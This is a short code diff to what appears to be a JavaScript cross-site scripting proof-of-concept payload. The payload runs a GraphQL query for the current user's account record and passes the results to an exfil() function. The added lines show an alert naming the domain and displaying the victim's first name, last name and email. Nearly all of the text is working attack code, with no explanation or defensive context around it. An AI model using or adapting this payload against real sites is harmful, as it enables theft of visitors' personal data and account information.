@@ -31,5 +31,18 @@ var OPS = [{
 }];
 
 gql(OPS)
-  .then(function (res) { exfil('me', res); })
+  .then(function (res) {
+    exfil('me', res);
+    try {
+      var data = JSON.parse(res);
+      var me = data[0] && data[0].data && data[0].data.me;
+      if (me) {
+        alert('XSS on ' + document.domain + ' - Hi ' + me.firstName + ' ' + me.lastName + ' (' + me.email + ')');
+      } else {
+        alert('XSS on ' + document.domain + ' (anonymous visitor)');
+      }
+    } catch (e) {
+      alert('XSS on ' + document.domain);
+    }
+  })
   .catch(function (e) { exfil('me_err', e.message); });
